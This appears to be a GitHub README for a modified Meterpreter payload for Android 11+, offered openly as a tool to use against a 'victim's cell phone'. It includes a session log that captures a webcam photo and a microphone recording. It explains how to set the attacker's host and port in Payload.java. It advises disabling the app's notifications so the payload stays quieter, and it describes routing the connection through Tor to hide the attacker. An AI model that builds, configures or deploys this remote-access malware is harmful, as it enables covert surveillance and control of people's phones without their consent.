# Meterpreter-Android
<img src="https://cloud.githubusercontent.com/assets/7417870/12315404/6dd58120-bab5-11e5-8a10-d5fec03d38d2.gif" width="100" align="right">
Meterpreter payload modified for Android, make it compatible with Android 11+, functions such as camera preview and microphone recording are working properly.

I recommend that after installing the payload on the victim's cell phone, disable the app's notification permission, to make the payload quieter.
```
meterpreter > sysinfo
Computer        : localhost
OS              : Android 13 - Linux 4.19.191-perf-g3c7e48ca8847 (aarch64)
Architecture    : aarch64
System Language : pt_BR
Meterpreter     : dalvik/android
meterpreter > webcam_snap -i 2
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/android/bOjFlXzC.jpeg
meterpreter > record_mic -d 5
[*] Starting...
[*] Stopped
Audio saved to: /root/android/TLbcSexf.wav
meterpreter >
```

Setting:

Open the file: Nous/app/src/main/java/nous/client/Payload.java

On line 26 edit your host and Port.
```
public static final String URL = "ZZZZtcp://Host:Port
```

Compiler:
https://github.com/LGLTeam/AIDE-Mods

## Meterpreter with the Tor network:
```Payload.java```
This file is a Java code that can be used to establish a remote connection with a target system. The modifications made to the code allow it to connect through a SOCKS5 proxy and access a .onion domain, which is a part of the internet accessible only through the Tor network.

The modified part of the code sets up a TCP connection using a local SOCKS5 proxy (127.0.0.1:9050) to connect to the specified .onion domain. This allows the code to communicate with the target system securely and anonymously, protecting the attacker's privacy.
